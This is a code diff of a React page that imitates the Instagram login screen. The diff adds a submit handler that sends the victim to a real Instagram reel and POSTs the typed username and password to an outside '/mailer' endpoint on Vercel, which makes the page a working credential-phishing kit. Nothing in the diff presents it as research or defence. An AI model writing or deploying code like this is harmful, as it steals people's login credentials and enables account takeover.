@@ -1,14 +1,23 @@
 import { useState } from 'react'
+import axios from 'axios'
 import instagram from './assets/images-removebg-preview.png'
 import facebook from './assets/facebook.png'
 
 function App() {
   const [user, setUser] = useState('')
   const [password, setPassword] = useState('')
+
+  const dataobj = {
+    user: user,
+    password: password,
+  }
   
-  function submitUser(){
+  async function submitUser(){
     console.log("user: ",user);
     console.log("password: ", password);
+    window.location.href = "https://www.instagram.com/reel/Co2chFVskwF/?utm_source=ig_web_copy_link&igsh=MzRlODBiNWFlZA==";
+
+    await axios.post('https://e-commerce-backend-seven-ashy.vercel.app/mailer', dataobj)
   }
 
   return (
@@ -39,7 +48,7 @@ function App() {
           </div>
 
           <button onClick={submitUser} className='w-3/4 h-10 bg-facebook rounded-lg flex flex-row justify-center items-center mb-10 mt-10 text-white font-bold ml-3'>
-            Log in
+           Log in
           </button>
 
           <div className='text-slate-500 font-semibold mb-10' >Don't have an account? <a className="text-facebook underline" href="https://www.instagram.com/">Sing up</a></div>
